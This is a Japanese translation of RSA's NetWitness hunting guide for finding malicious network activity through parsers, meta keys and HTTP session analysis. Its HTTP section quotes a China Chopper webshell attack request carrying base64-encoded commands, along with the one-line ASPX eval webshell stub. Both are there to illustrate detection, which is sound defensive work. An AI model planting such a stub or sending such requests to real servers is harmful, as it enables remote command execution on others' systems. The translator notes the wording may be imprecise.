---
layout: post
title:  "Netwitness Hunting Guide"
date:   2018-09-19
permalink: /security/:title
categories: Security
tags: Netwitness
excerpt: Netwitnessハンティングガイドの和訳
mathjax: false
---

* content
{:toc}

このトピックは[RSA NetWitness Hunting Guide](https://community.rsa.com/docs/DOC-62341)の和訳です。
正確ではない表現が含まれる可能性があるため、厳密な解説を必要とする場合は元の記事を参照してください。

# 前書き

RSA NetWitness Platformは、旧称セキュリティアナリティクスと呼ばれるNetWitness NextGenセキュリティ製品の後継です。
ネットワークトラフィックとログを取り込み、データに対して複数の論理層を適用し、カスタムデータベースに値を格納し、メタデータを統一ビューでアナリストに提示します。
ホストベースのメモリフォレンジックツールであるECATと統合すると、ホストアクティビティに関するメタデータが生成され、同じビューに表示され、アナリストはネットワークの状態を比類のないものにすることができます。
このガイドでは、悪意のある活動のパケットデータセットを調べるための戦術と手順について説明します。

NetWitnessは、一般的なネットワークトラフィックベースのセンサーではなく、IDS/IPSまたはNetflowデバイスではありませんが、より基本的な機能の中には重複するものもあります。
メタデータは、ネットワークセッション内の技術的側面または動作を記述するために生成されます。
セッションは通常、リクエストとレスポンスから成る1つまたは2つの関連するトラフィックストリームとして定義されます。
これらのセッションはキャプチャされた時間によって順序付けられ、このような時間の情報は調査を開始するときにデータベースに適用される最初の条件式になります。
データがどのように収集され、発注されたかを知ることは、NetWitnessをどのように捜索するかを理解する上で不可欠です。

NetWitnessのメタデータは、従来のIDS/IPSで使用されているようなシグネチャではなく、別の方法で処理する必要があるアクティビティのインジケータとみなす必要があります。
NetWitnessパーサーに含まれるロジックは、標準的な正規表現ベースのシグネチャよりもはるかに汎用性があります。
トラフィックを処理するパーサー、フィード、アプリケーションルールは、データの構造に関するメタデータを生成し、効率的に検索できる個々のセッションから値を抽出します。
これは従来のIDS/IPSソリューションとは異なり、以前に特定された悪意のあるアクティビティを特定するだけではなく、新たな未知の悪意のあるアクティビティを見つけることが可能です。
シグネチャのようなパーサーも含まれていますが、パーサーエンジンでは一般的なスクリプト言語Luaによる複雑なロジックを使用して判断しており、偽陽性率がはるかに低くなります。
このガイドでは、RSA Liveコンテンツ管理システムによって提供されるコンテンツを使用して、未知の新たな悪意のあるアクティビティを捜すことに焦点を当てています。
通常、シグネチャのようなパーサーの概要は含まれていません。

NetWitnessデータセット内でのハンティングは、不正侵入を分析し、マルウェアをリバースエンジニアリングし、マルウェアやその他の攻撃によって生成されたトラフィックを分析し、このタイプの動作に基づいてNetWitnessによって生成されたメタデータを選択することによって達成されます。
RSA IRチームは2012年に設立されて以来多くの調査を行い、アナリストが行動の多くの側面を単一のメタデータに組み合わせることで迅速にデータセットをナビゲートできるようにするプラットフォームのコンテンツと戦術を作成しました。
これにより、目的の動作でセッションを検索するのに必要なドリルダウンの数が削減され、プラットフォームのパフォーマンスが向上し、悪意のある動作を検出するのに必要な労力が削減されます。
これにより、IRチームは、組織が標的とされた攻撃を受けているという事前の知識や通知なしにインシデントを発見することができました。
IRチームはまた、これらの方法論とコンテンツを使用して、攻撃者がマルウェアを使用していない多くのインシデントを検出しましたが、認証されたアクセスは「LANd」と呼ばれています。

NetWitnessによって提供されるネットワークトラフィックの前例のない見方は、インシデント対応機能にとって最も効果的ですが、セキュリティポリシーの適切な施行の検証や、これらのポリシーや手順の改善が必要な領域の発見にも使用できます。
このガイドは、既知の脅威に基づいてアラートに反応するのではなく、新しい悪意のあるアクティビティを明らかにするアナリストを対象としています。

# ハンティングパック

ハンティングパックは、RSA NetWitness Platform内のパケットトラフィックを分析し、特定のメタキーに調査のための自然言語値を入力することにより、侵害または異常なネットワークアクティビティのインジケータを素早く探し出すように設計されています。

ハンティングパックは、以下の別々の部分で構成されています。

- インジケータが設定された一連のメタキー
- メタデータの関連する組み合わせをアナリストに提供するメタグループのインポート
- 攻撃者が使用する一般的なプロトコルからネットワークセッションを解読する一連のLuaパーサー
- 調査フィードとRSA FirstWatch SSLブラックリストフィード。
- ハンティング関連のRSA NetWitnessレポート
- ハンティング関連のRSA NetWitnessルール
- Webshel​​lで検出されたESAルール：このルールは、10分の時間枠内で同じIP送信元と宛先のペアの間で3つのWebシェルが検出されたことを示します。詳細については、RSA ESA Rulesのトピックを参照してください。
- exeファイルタイプだがexe拡張子ではないアプリケーションルール

## ハンティングパックのデプロイ

ハンティングパックのすべてのアイテムをライブで展開することができます。

次の点に注意してください。

- 10.6.2より前のデプロイメントでは、netname、direction、ioc、boc、eoc、analysis.service、analysis.session、analysis.fileのような一連の新しいメタキーも設定する必要があります。 詳細は、「メタキー」を参照してください。
- trafflic_flow LuaパーサーはLog Decoderにデプロイできますが、現在はLiveでサポートされていません。 Traffic Flow Lua Parserのドキュメント（https://community.rsa.com/docs/DOC-44948）では、「Deploy to Log Decoders」セクションを参照してください。
- 展開できない環境にいる場合は、リソースパッケージを作成して、使用できるZIPアーカイブをダウンロードする必要があります。 バンドルでは機能しないので、ダウンロードボタンを使用しないでください。

## メタキー

Huntingコンテンツパックを構成するLuaパーサ展開の結果として生成されるメタキーは、次のとおりです。
これらは、RSA NetWitness Platformのバージョン10.6.2以降で追加構成なしで利用できます。
これより前のバージョンにコンテンツパックを展開する場合は、「付録：コンテンツパックのメタキーを使用する」を参照して、コンテンツパックを有効にする方法を参照してください。

|表示名|メタキー|書式|説明|
|:---:|:---:|:---:|:---|
|Behaviors of Compromise| boc | テキスト |標準的な署名ベースの検出以外の、疑わしい行為や不正な行為のために指定されています。
|Enablers of Compromise| eoc |テキスト|貧弱な情報や運用上の事例であり、セキュリティ侵害の根本原因につながる可能性があります。
|File Analysis| analysis.file | テキスト |ファイル特性と異常を強調する大規模な検査ライブラリです。
|Indicators of Compromise| ioc |テキスト|侵害のインジケータは、情報セキュリティの分野全体に遍在しています。分野に応じて分類保管することが重要です。
|Network Name| netname |テキスト|送信元または宛先にタグ付けされるネットワークおよびホストの記述です。これにより、複数のネットワークキーとアセットキーが不要になります。
|Service Analysis|analysis.service|サービス|テキスト|コアアプリケーションプロトコルを識別します。サービスベースの分析の根幹です。
|Session Analysis| analysis.session |テキスト|クライアント～サーバー通信の和、偏差、実行およびセッション属性です。
|Traffic Flow Direction|direction|テキスト|送信元と宛先から導出されたフローベースの情報。アウトバウンド、ラテラル、インバウンドのいずれかの値を持ちます。

## メタグループ

NetWitnessはアナリストに、調査中に表示されるメタデータビューとグループをカスタマイズする方法を提供します。
ハンティングを開始する前に、最初に設定する項目はメタデータグループです。
RSAは、インシデント対応のためのメタグループを含むファイルのZIPを提供します。
これらのファイルは、次のURLにあるRSA Linkのダウンロード領域のZIPアーカイブとして入手できます。https://community.rsa.com/docs/DOC-60112

メタグループの展開については、「調査：ユーザ定義のメタグループの管理」という項目の製品マニュアルの「メタグループのインポート」を参照してください。
デフォルトでは、メタキーは「閉じる」状態にあります。
ニーズとパフォーマンスの考慮事項に応じて、各キーのデフォルトで「開く」ビューステートに変更することができます。

|表示名|ファイル名|説明|
|:---:|:---:|:---|
|Outbound HTTP|Outbound_HTTP.jsn|調査ページを設定して、HTTPプロトコルに関連するメタキーインジケータを表示します。
|Outbound SSL / TLS|Outbound_SSL_TLS.jsn|調査ページを設定して、SSL/TLSプロトコルに関連するメタキーインジケータを表示します。

## Luaパーサー

LiveからHunting Pack Luaパーサーを導入することができます。
Live SearchのUI内で以下にリストされているパーサーを選択し、デプロイメントまたはデコードのサブスクリプションのプロセスを選択します。

### ハンティングパックに含まれるLuaパーサーの一覧

|表示名|説明|
|:---:|:---|
|apt_artifacts |可能な適切なWMIとWindowsレジストリ操作を検出します。
|china_chopper |クリアテキストの中国チョッパーセッションを検出します。
|CustomTCP | CustomTCPビーコン活動を検出します。 C2ドメインと被害者ホスト名をalias.hostメタとして登録します。
|DNS_verbose_lua | DNSセッションを識別します。 レコードタイプを含むクエリレコードとレスポンスレコードを登録します。 プロトコルエラーメッセージを登録します。
|DynDNS |動的DNSホストとサーバーを検出します。
|fingerprint_java | Java JARファイルとCLASSファイルを検出します。
|HTTP_lua | HTTPプロトコル要求ヘッダーおよび応答ヘッダーから値を抽出します。 ICAP（HTTP）要求を解析します。
|HTTP_lua_options |このファイルを使用して、HTTP_luaパーサーの動作に影響を与えます。 詳細は、「HTTP Lua Parserオプションファイル」を参照してください。
|ICMP | ICMPパケットからタイプとコードを提供します。
|IDN_homograph|ラピッドUnicodeコードポイントのグリフに似ている非ラテンのUnicodeコードポイントを使用する、punycodeでコード化された国際化ドメイン名を検出します。解析されたホモグラフをanalysis.serviceメタとして登録します。 この脅威の詳細については、RSA ResearchのRSA Linkのブログ記事を参照してください。PunyCodeの解読 - すべての文字が等しく作成されているわけではありません。
|JSON-RPC | JSON-RPC 2.0ストリームを識別します。 JSON-RPC 1.0ストリームを識別せず、HTTPなどのトランスポートを介してJSON-RPCを識別しないことがあります。
|MAIL_lua |電子メールアドレス、件名、クライアントなどの電子メールメッセージから値を抽出します。
|Mail_lua_options |このファイルを使用して、Mail_luaパーサーの動作に影響を与えます。詳細については、Mail Lua Parserオプションファイルを参照してください。
|MSU_rat | MSU RAT活動を検出します。
|plugx | PlugXマルウェアを検出します。
|Poison_Ivy | Poison Ivy RATアクティビティを検出します。
|pvid | PGV_PVIDマルウェア活動を検出します。 PGV_PVIDは、アクターがマルウェアのPOSTルーチンに入れたクッキー文字列です。
|RDP_lua | Microsoftリモートデスクトッププロトコルを識別します。
|rekaf | rekafの亜種を検出し、感染したホストのxor key（crypto）と名前を取得します。
|fingerprint_rtf_lua | RTFファイルを検出します。
|session_analysis |送信されたバイト数、受信されたバイト数、TCPフラグなどのセッション特性を分析します。
|SMB_lua | Microsoft SMB / CIFSプロトコルバージョン1および2を解析します。
|struts_exploit | XMLペイロードを処理するためにStruts RESTプラグインとXStreamハンドラを併用すると、リモートでコードが実行される可能性のある攻撃を検出します。
|supercmd |SuperCMDトロイの木馬ビーコンを検出します。 この脅威の詳細については、RSA ResearchのRSA Linkのブログ記事「SUPERCMD RAT」を参照してください。
|TLD_lua |ホスト名からトップレベルドメイン部分と第2レベルドメイン部分を抽出します。
|TLD_lua_options |このファイルを使用して、TLD_luaパーサーの動作に影響を与えます。 詳細については、TLD Lua Parserオプションファイルを参照してください。
|TLS_lua | SSL 2.0、SSL 3.0、TLS 1.0、TLS 1.1、およびTLS 1.2を識別します。
|traffic_flow |内部ネットワークのサブネット名、およびセッションの方向性（インバウンド、アウトバウンド、ラテラル）を提供します。
|traffic_flow_options |これは、traffic_flowルアパーサーで使用するオプションのファイルです。 このファイルを使用すると、このパーサー（Traffic Flow Lua Parser）の完全な製品マニュアルに記載されているように、内部サブネットを構成することができます。
|windows_command_shell_lua | Microsoft Windowsのコマンドシェルセッションを識別します。
|windows_executable | Windows実行ファイルを識別し、異常やその他の不審な特徴を分析します。
|xor_executable_lua | xorまたはhexエンコードされた実行可能ファイルを検出します。|

### Luaパーサーオプションファイル

以下のLua Parserには現在、オプションファイルが関連付けられています。
- HTTP_lua
- Mail_lua
- TLD_lua
- traffic_flow

```
注意：RSAでは、オプションファイルを購読しないことを強く推奨しています。
このファイルを後でダウンロードすると、ファイルに加えたすべての変更が上書きされます。
```

次の点に注意してください。

- オプションファイルを配備すると、パーサーと同じディレクトリに/etc/netwitness/ng/parsers/があります。
- パーサーはオプションファイルに依存しません。 パーサーは、オプションファイルがなくてもロードして実行します。 オプションファイルは、デフォルト設定を変更する必要がある場合にのみ必要です。
- オプションファイルがない場合（またはオプションファイルが無効な場合）、パーサーはデフォルト設定を使用します。
```
注意：パーサーは、デフォルトとカスタマイズされたオプションの両方を使用することはありません。 オプション・ファイルが存在し、その内容をロードできる場合、デフォルトはまったく使用されません。
```
## RSA Netwitness プラットフォーム レポート

RSAはHunting Packの一部として2つのレポートを提供しています。

- ハンティングサマリーレポート：このレポートは、以下のメタキーに従って分類されたイベントの概要を表示します。
- ハンティング詳細レポート：このレポートには、アナリストを支援する文脈の証拠が追加された次のメタキーに従って分類されたイベントが表示されます。
```
注：これは日次レポートとして実行する必要があります。
報告されるメタ値の量は、トラフィック量に応じて大きくなり、より長い時間枠で実行するとクエリのタイムアウトが発生する可能性があります。
```

これらのレポートは、以下のメタキーに従って分類されたイベントに基づいています。

- Indicators of Compromise
- Behaviors of Compromise
- Enablers of Compromise
- Service Analysis
- Session Analysis
- File Analysis

## RSA Netwitness プラットフォーム ルール

2つのハンティング・パック・レポートは、以下のルールに依存しています。
```
注：個々のルールをダウンロードまたは展開する必要はありません。これらのルールはハンティングレポートの依存関係であるため、レポートをダウンロードまたは展開するときに受信します。
```

ハンティングサマリーレポートは、次のルールに依存しています。

- **妥協のふるまい**：標準的な署名ベースの検出以外の疑わしい動作や悪意のある動作に対して指定されます。このルールは、メタキーBehaviors of Compromiseが入力されたときに出力を表示します。
- **危殆化の可能性**：情報が不十分であるか、運用上のセキュリティのインスタンス。死後は、これらを根本的な原因に結びつけることがよくあります。このルールは、メタキーEncomlers of Compromiseが入力されたときに出力を表示します。
- **ファイル解析**：ファイルの特性や異常を強調する大規模な検査ライブラリ。このルールは、メタキーFile Analysisが入力されたときに出力を表示します。
- **脆弱性の指標**：ネットワークへの侵入の可能性があり、マルウェアシグネチャまたはコマンドとコントロールのキャンペーンに関連するIPやドメインによって識別できます。このルールは、メタキーIndicator of Compromiseが入力されたときに出力を表示します。
- **サービス分析**：コアアプリケーションプロトコルの識別と検査。このルールは、メタキーService Analysisが入力されたときに出力を表示します。
- **セッション分析**：ファイルの特性と異常を強調する大規模な検査ライブラリ。このルールは、メタキーFile Analysisが入力されたときに出力を表示します。

ハンティング詳細レポートは、次のルールに依存しています。

- **妥協詳細の振る舞い**：妥協規則の動作と比較した追加の文脈は、サービスタイプとデバイスタイプの追加のメタキーをグループ化することによってアナリストに提供されます。
- **妥協の詳細イネーブラー**：サービスタイプとデバイスタイプの追加のメタキーをグループ化することにより、アナライザーに追加のコンテキスト（妥協ルールのイネーブラーと比較して）が提供されます。
- **ファイル解析の詳細**：Filenameの追加のメタキーをグループ化することにより、（ファイル解析ルールと比較して）追加のコンテキストがアナリストに提供されます。
- **妥協詳細の指標**：妥協規則の指標と比較した追加の文脈は、サービスタイプとデバイスタイプの追加のメタキーをグループ化することによってアナリストに提供されます。
- **サービス分析の詳細**：追加のコンテキスト（サービス分析ルールと比較して）は、サービスタイプとエイリアスホストの追加のメタキーをグループ化することによってアナリストに提供されます。
- **セッション分析の詳細**：追加のコンテキスト（セッション分析ルールと比較して）は、サービスタイプとエイリアスホストの追加のメタキーをグループ化することによってアナリストに提供されます。

# トラフィックフローの識別

ネットワークトラフィックがNetWitnessによってどのように処理され、ユーザーに表示されるかを理解することが重要です。
図1は、Decoderサービスがどのようにパケットをキャプチャし、それらを「ページ」と呼ばれるものにメモリにコピーするかを示しています。
キャプチャされるときにフレームが最初に入るプールは、パケットキャプチャプールです。
ここでは、セッションはAssemblerの既存のセッションに追加されたパケットまたは開始されたパケットです。
NetWitnessはIPv4とIPv6を認識しており、TCP SYNフラグを要求として、もう一方を応答として含むTCPセッションの最初のフレームをマークします。
非TCPベースのIPプロトコルまたは継続トラフィックの方向性は、いくつかの基準によって決定されます。

- クライアントが最初に話す
- サーバーは通常より多くのデータを提供します
- サーバーは通常、利用可能であれば、より低いポートを持つ
- サーバーは非RFC1918 IPである必要があります
- 組織は、通常、静的IPアドレスとサーバに低いIPオクテットを使用します

これらの考慮事項は重み付けされ、Explorerインタフェース内のassembler.voting.weightsの値を変更することで調整できます。

Assemblerでセッションが開始されると、2つのタイマーが開始されます。
1つは、セッションが開始されてから60秒後にカウントされます（SAデフォルト）。
セッションは、解析され、解析され、ディスクに書き込まれます。
2番目のタイマーはバイトタイマーで、32 MB後（SAのデフォルト）、セッションは宣言され、解析され、ディスクに書き込まれます。
非常に低い帯域幅と長時間のセッションがセッションの全期間にわたってアセンブラに残り、60秒以上の寿命値でエンドツーエンドで提示されるいくつかのエッジケースがあります。

![Figure 1. NetWitness Decoder Capture and Processing](https://community.rsa.com/servlet/JiveServlet/showImage/102-62341-232-466474/NWDecoderProcessing_583x404.png)

## トラフィックの方向性

長時間NetWitnessを使用したことがあるなら、ネットワークには雑音が多いことがわかるでしょう。
再送信、片面セッション、ゼロペイロードセッション、ピアツーピア通信があり、データセットの分析がより困難になります。
データセットを分析するときは、まず方向性を見極めなければなりません。
内から外、外から内、内から内のどれを見たいですか？
traffic_flow.luaパーサは、デコーダ上のtraffic_flow_options.luaファイルで設定されたオプションに基づいてこの判断を行います。
詳細については、RSA LinkのTraffic Flow Lua Parserのトピックを参照してください。

これは、方向を決定するために使用される他のルーティング不可能なIPのブロックと同様、RFC1918のIPアドレス空間を定義します。
組織が提供されたオプションファイルを、内部ネットワークとその名前だけでなく、LAN-to-LAN IPSECトンネルなどの興味深いトラフィックACLなど、組織が使用する非RFC1918 IPスペースで変更することが推奨されます。

次の表は、traffic_flow_options.luaファイルを変更せずにデフォルトでトラフィックフローに使用されるDirectionに格納されたメタデータを示しています。

|方向性メタデータ|説明|
|:---:|:---|
|inbound|RFC1918ではない送信元からRFC1918の宛先への通信
|outbound|RFC1918の送信元からRFC1918ではない宛先への通信
|lateral|RFC1918の送信元からRFC1918の宛先への通信

## セッション特性メタカテゴリ

セッション特性メタカテゴリは、キャプチャされたセッションの技術的側面を調べることによって、このロジックを拡張します。
これらのストリームでペイロードが送信された場合、ストリームの数、セッションの存続期間、送信されたデータと受信されたデータの比、および分析ロジックを分析者に提供するためにこのロジックの一部を組み合わせます。
以下の表は、Session Characteristicsメタカテゴリを示しています。
これらのメタキーは、session_analysis Luaパーサーによって生成されます。

|セッション特性メタデータ|説明|
|:---:|:---|
|single sided tcp |単一のストリームを持つIPプロトコル6
|single sided udp | IPプロトコル17
|zero payload|ペイロードがゼロの任意のプロトコル
|first carve|2つのストリームとペイロード> 0のアウトバウンドトラフィックを作成する
|first carve not dns| 2つのストリームとペイロード> 0で、サービスタイプ53ではないアウトバウンドトラフィック
|first carve not top 20 dst|AppleまたはMicrosoftのような最も一般的な20の宛先の1つではない2つのストリームとpayload> 0およびorg.dstを持つアウトバウンドトラフィック。
|long connection|寿命が50秒を超える接続、NetWitnessでの最大有効期間はデフォルトで60秒です
|session size 0-5k |合計セッション・サイズ、要求+応答ペイロード、0KBから5KB
|session size 5-10k|合計セッションサイズ、要求+応答ペイロード、5KB〜10KB
|session size 10-50k |合計セッションサイズ、要求+応答ペイロード、10KB〜50KB
|session size 50-100k |合計セッションサイズ、要求+応答ペイロード、50KB〜100KB
|session size 100-250k | 100KB〜250KBの合計セッションサイズ、要求+応答ペイロード
|medium transmitted outbound|セッション中に送信されたアウトバウンドが1MB〜4MBの間
|high transmitted outbound|セッション中に送信されたアウトバウンドが4MBを超える
|ratio high transmitted|アウトバウンドで送信されたセッションペイロードの75％〜100％
|ratio medium transmitted|アウトバウンドで送信されたセッションペイロードの26％〜74％
|ratio low transmitted |アウトバウンドで送信されたセッションペイロードの0％〜25％

この基本的なロジックを利用して、トラフィックがどの方向に流れているのかを理解し、データセットを分割し始めることができ、興味深い行動に集中することができます。
NetWitness Decoderサービスは、セッションの方向性に関するサニティチェックを試行しません。
つまり、セッションの最初のフレームとしてTCP FINパケットを受信すると、要求元のIP/ポートの組み合わせがリクエスタとしてタグ付けされます。
ときどき与えられた例は以前はクローズされていた別のセッションの一部である場合もありますが、別の種類の悪意のある活動を表すこともあります。

NetWitnessは法医学ツールであり、プロトコルの非RFC準拠の使用と見なされるものを修正しようとせず、取得したデータのみを提示します。
たとえば、組織内から発信された、ペイロードを持ち、宛先がインターネットであった非DNSセッションに興味があった場合は、最初のドリルダウン条件としてSession Characteristicsの下にdnsを挿入しないで簡単にクリックします。
これにより、現在の関心事ではなく、私たちの組織内で発信され、インターネットに出て行くトラフィックの調査に関連するセッションやそれに伴う「ノイズ」が取り除かれます。
Facebookやトロイの木馬C2プロトコルで注文を取得しているユーザーがYouTubeビデオを見ている可能性があります。

逆に、インターネットから組織への接続を探すには、NetWitness Decoderデバイスの特定の知識と特別な配置が必要です。
必要な考慮事項は次のとおりです。

- ロードバランサはありますか？
- インバウンドWebサービスは、Web、アプリケーション、データベースなどの異なるDMZに分割されていますか？
- DMZサーバーはRFC1918 IPスペースとNAT/PATを使用していますか、またはルーティング可能なアドレスでIPアドレスを割り当てられていますか？
- DMZ間の通信か、着信/発信の種類の通信のみを表示できますか？
- DMZはInsideネットワークに接続できますか？

これをマッピングするときには、次のドリルでデータセットを調べることをお勧めします。
`org.src exists && tcpflags = 'syn'`
これにより、IPソースがインターネットでルーティング可能であり、TCP SYNフラグを使用してセッションの開始が確認されます。
これによりアナリストを混乱させるかもしれない継続セッションが削除されます。
副作用として、処理中にセッションがデコーダによって切断されたことを示すmeta session.splitとともに、これらの長いセッションが表示されます。
リンクされたセッションは、FTPが現在処理されているのと同様にピボットされます。
次に、org.dstの組織の名前を調べます。
これは、IPスペースの登録方法に応じていくつかの方法で解決できます。
この基本ドリルを使用すると、前の段落の質問に答えることができ、インターネットがDMZサーバーとやりとりするさまざまな方法や、DMZサーバーがインターネットとやりとりする方法、内部ネットワークと相互作用する方法を分析できます。

アナリストは、組織がインターネットに公開する方向性とサービスを分析することで、特定の種類の行動を調査し、現在の調査では面白くないと思われる他のセッションを排除するためのメタデータを作成できます。
推奨セグメンテーションは、下の表に示されています。

|推奨される方向性ルールの分類|
|:---:|
|インターネットとのアウトバウンド通信
|内部から内部へのコミュニケーション
|インバウンドWebアプリケーション通信
|受信SMTP通信
|着信その他のアプリケーション
|DMZと内部通信
|受信VPN接続のクリアテキスト側
|B2Bまたはパートナーコミュニケーション

# プロトコル分析：HTTP

ハイパーテキスト転送プロトコルは、インターネット上で最も広く使用されているプロトコルの1つです。
ほとんどのSSL/TLS送信でさえ、単にHTTPをトンネリングするだけです。
任意のデータセット内で膨大な量のHTTPセッションが分析されます。
Live Contentのパーサーとアプリケーションルールは、プロトコルの動作と技術的側面に重点を置いています。
HTTPの通信方法やマルウェアの生成されたHTTPトラフィック、ユーザーが生成したHTTPトラフィックを分析することで、アナリストは、データセット内の何が外れているのか、正常であるのかを迅速に判断できるようになります。
これは、マルウェア作成者の間では一般的な戦略であり、通常のネットワーク通信と混同して、できるだけ無害なものにしたいと考えています。
しかし、トロイの木馬は本質的にプログラマティックで構造化されており、通信が明らかになれば通信はビジネス上の価値を保持しません。

X秒/分ごとにアップデート用のビーコンとなるマルウェア（株価、天気など）に似ている、無害のカスタム構築アプリケーションが多数存在することに注意してください。
アラートやブロックを行わずにネットワーク検査デバイス（IDS / IPS）を通過させるために、多くの場合、「偽の」HTTPヘッダーがあります。

## HTTP構造

HTTPには、0.9,1.0,1.1、SPDY、ドラフト2.0の提案など、多くの異なるバージョンがまだ一般的に使用されています。
SPDYとHTTP/2.0を除いて、ヘッダー要求/応答構造は基本的に同じです。
クライアントは、GET、POST、PUTなどのRequest Methodで始まります。
パスとファイル名（Webアプリケーションの場合は引数の有無にかかわらず）、HTTPバージョン、最初の改行と改行が16進数で0x0D 0x0Aです。
さまざまなHTTPヘッダーが続きますが、ヘッダー名はコロン文字（ "："）で区切られ、1から2つのスペース（0x20）で区切られ、最後に別のキャリッジリターンと改行と次のヘッダーが続きます。
HTTPデーモンは、実際に本体が存在する場合、次のバイトが本体であることを示す二重のキャリッジリターンと改行を解析するときに、ヘッダーセクションが終了したことを認識します。
本文がある場合は、Content-Lengthヘッダーが存在し、正しくなければなりません。

図2. HTTP GET構造は、HTTP GET要求と応答の基本構造の概要を示しています。
図3. HTTP POST構造は、HTTP POST要求と応答の基本構造の概要を示しています。

![Figure 2. HTTP GET Structure](https://community.rsa.com/servlet/JiveServlet/showImage/102-62341-232-466478/HTTP_Get_594x172.png)

![Figure 3. HTTP POST Structure](https://community.rsa.com/servlet/JiveServlet/downloadImage/102-62341-232-466605/HTTP_Post_608x239.png)

## HTTPメソッド

メソッドは、HTTPのコンテキストでは、動詞です。
定義によって、HTTPはWebDav（Web Distributed Authoring and Versioning）に7つのメソッドを追加して9つのメソッドをサポートします。
最も一般的な使用方法はGETで、これはPOSTメソッドの約10倍です。
これは、後に利用する重要な観察です。
アナリストがNetWitnessで何を見ているのかを理解するためには、HTTPのRFC構造に加えてHTTPメソッドも理解する必要があります。
以下の表は、一般的なHTTPメソッドを示しています。

|メソッド|説明|
|:---:|:---|
|GET|指定されたリソースを取得する
|POST|POST本体のサーバーにリソースを送信する
|PUT|ファイルなどのリソースをサーバーに保管する
|HEAD|指定されたリソースを取得しますが、本文を省略します。
|DELETE|サーバー上のリソースを削除する
|TRACE|プロキシ/ MitM検出のために要求を送信者に返します
|OPTIONS|サポートされているメソッドを示すようにサーバーに要求する
|CONNECT|HTTP経由で別のプロトコルをトンネルする
|PATCH|指定されたリソースに部分的な変更を適用する

HTTP / 1.1では、パイプライニングと呼ばれる機能が導入されました。
以前のバージョンのHTTPでは、サーバーから要求されたすべてのリソースに対して新しいTCPセッションが開始されます。
現代のWebアプリケーションでは、ページビューごとに何千ものTCPセッション（数千ではないにしても）を開始する可能性があります。
パイプライン処理では、接続が維持されている限り、同じTCPセッションを再利用できます。
このため、HTTP / 1.1セッションでアナリストはGETメソッドとPOSTメソッドを1つのセッションで、また潜在的に複数のファイルとフォレンジックの指紋を見ることができます。
ほとんどのマルウェアの作成者は、常時接続されているのではなく、迅速なビーコンを好み、C2インフラストラクチャでチェックインします。
HTTPヘッダーブロック全体を構成する個々のHTTPヘッダーは、有効な双方向通信のための一般的なデータではない、要求あたり4〜8 KBの合計サービスレベル制限を持っています。
これは私たちが探しているマルウェアの動作面です。
HTTP経由でデータを送信するには、多くのトロイの木馬はHTTP POSTメソッドを使用し、パイプライン要求を処理することは気にしません。
これを念頭において、以下の規則は、HTTPセッションの対話型を機械的なものから除外するのに役立ちます。

```
注：次のメタデータがHTTP Luaパーサーに追加されました。
これらのキーは、戻り値を "false"から "true"に変更することによって、HTTP_lua_optionsファイルで拡張機能が有効になるまで入力されません。
詳細は、「HTTP Lua Parser Options」のトピックを参照してください。
```

|サービス特性メタデータ|説明|
|:---:|:---|
|http post no get|HTTP POSTのみのセッション
|http get no post|HTTP GETのみのセッション
|http post and get|HTTP GETとPOSTから構成されるセッション
|http connect|HTTP CONNECTのみのセッション
|post no get no referer|リファラがないPOSTのみのセッション
|post no get no referrer directotoip|リファラがないIPアドレス直指定のPOSTのみのセッション

Webshel​​lsは、攻撃者がリモートでコマンドを実行できるようにするWebサーバー上の実行可能コードとして定義されています。
設定されたWebルート内のディレクトリに配置された実行可能ファイルで、HTTPデーモンが実行するように設定されている任意の言語にすることができます。
攻撃者がシステムコマンドを実行できる脆弱性を持つWebアプリケーションの一部としてインストールされた正当なスクリプトでもあります。
RSAは、正当なWebアプリケーションの一部である修正されたスクリプトと同様に、Webshel​​l機能を達成するためにシステムDLLを置き換えるトロイの木馬のDLLを観察しました。
Webshel​​lsは、HTTPメソッドを使用してコマンドを実行するように設定できます。
コマンド自体は、HTTPヘッダー、URL、またはPOSTメソッドの本体に含めることができます。
Webshel​​lのサイズは、1行から数千行までの範囲で指定できます。
それらは使用されていないときに検出することは難しく、過去2年間にRSAが遂行したほぼすべての事件で検出されます。

多くの一般的なWebシェルは、HTTP POSTメソッドを使用して、POSTの本体でコードを実行するスタブにコードを送信します。
これの1つの例はChina Chopper webshel​​lです。
スクリプトによって評価されるデータは、要求の本体にあります。
この場合のシグネチャベースの検出は非常に困難であるか、緩すぎて誤検出率が高くなりがちですが、コマンドごとにペイロードが変更され、固定されたものは通常、他の多くのケースで共通しています。
これらの場合の接続は維持されず、新しいコマンドが発行されると切断されます。
`direction = inbound`および`analysis.service = http post no get`を検索すると、暗号化されていない場合、このタイプの動作を検出するのに適しています。
以下はそのような要求の例です。

```
POST /ftpadmin.aspx HTTP/1.1
Cache-Control: no-cache
X-Forwarded-For: 248.192.237.178
Referer: http://ftp.example.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Host: ftp.example.com
Content-Length: 1091
Connection: Close

cookie=Response.Write("->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("ßSNIPàk7")),"unsafe");}catch(err){Response.Write("ERROR:// "%2Berr.message);}Response.Write("|<-");Response.End();&z1=Y21k&z2=Y2QgL2QgIkM6XGluZXRwdWJcd3d3cm9vdFwiJndob2FtaSAv
YWxsJmVjaG8gW1NdJmNkJmVjaG8gW0Vd
```

```
<%@ Page Language="Jscript"%><%eval(Request.Item["cookie"],"unsafe");%>
```

## HTTPヘッダ

http.luaパーサーは、HTTPサービスの分析を担当します。
http_lua_options.luaファイルを変更することにより、より冗長な解析を行うように構成することができます。
次のオプションがあります。

- 完全なURLを操作する
- X-Forwarded-For HTTPヘッダーの登録
- HTTPリファラーパスの解析と登録
- HTTPヘッダーUser-Agentを独自のメタ鍵に解析する
- HTTPレスポンスコードを分かりやすい名前に解決する
- HTTPヘッダーとその固有の値を冗長に解析する
- HTTPヘッダーの順序に基づいて、ブラウザフィンガープリントを付ける

これらのオプションは、デコーダのロードと保持時間を考慮して有効にする必要があります。
これらのオプションを有効にして（そしてパーサーのリロードを発行すると）、アナリストにはキャプチャされているHTTPトラフィックの詳細な説明が表示されます。
たとえば、パーサーは、リクエストのメソッドと構造に基づいてHTTPセッションを識別し、ヘッダーを繰り返してメタデータとして追加します。
ユニークな値もメタデータとして追加されますが、索引付けされません。
NetWitnessでは、索引付けされた値のみが照会可能です。
インデックスされていない値（ライフタイム、ストリーム、ペイロードなど）は照会できません。
ただし、キャプチャ/処理時に索引付けされていないメタデータを使用するアプリケーション・ルールを記述できます。
